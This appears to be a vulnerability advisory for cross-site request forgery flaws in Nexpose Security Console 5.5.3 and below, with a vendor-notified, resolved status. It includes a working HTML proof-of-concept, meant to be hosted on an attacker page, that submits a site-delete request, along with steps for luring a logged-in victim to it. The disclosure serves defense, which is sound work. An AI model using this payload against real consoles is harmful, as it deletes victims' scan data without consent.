Description:
Multiple Cross-Site Request Forgery (CSRF) vulnerabilities in Nexpose
Security Console 5.5.3 and below allow remote attackers to submit
actions on a legitimate user’s behalf.
By not properly checking each URL, an attacker can execute requests on
behalf of a legitimate user.
If an authenticated user is tricked into visiting a specially crafted
page, it may be possible to perform user-initiated actions on the web
application using the victim’s established session.
Successful exploitation of this vulnerability resulted in deleting scan
data and sites during the proof-of-concept.

Exploit steps for proof-of-concept:
1.      Create an external site/page:
http://attackersite.com/nexpose-csrf.htm that contains:
[code]
<html>
   <!-- Nexpose CSRF PoC -->
   <body>
     <form
action="https://nexpose-security-console-site:3780/data/site/delete?siteid=1"
method="POST"  enctype="multipart/form-data">
       <input type="submit" value="delete site" />
     </form>
     <script>
       //document.forms[0].submit(); //uncomment to auto-submit
     </script>
   </body>
</html>
[/code]
2.      Lure victim to http://attackersite.com/nexpose-csrf.htm.
3.      Site with ID 1 is deleted when form is submitted.

Vendor Notified: Yes
Vendor Response: Quickly escalated and resolved.
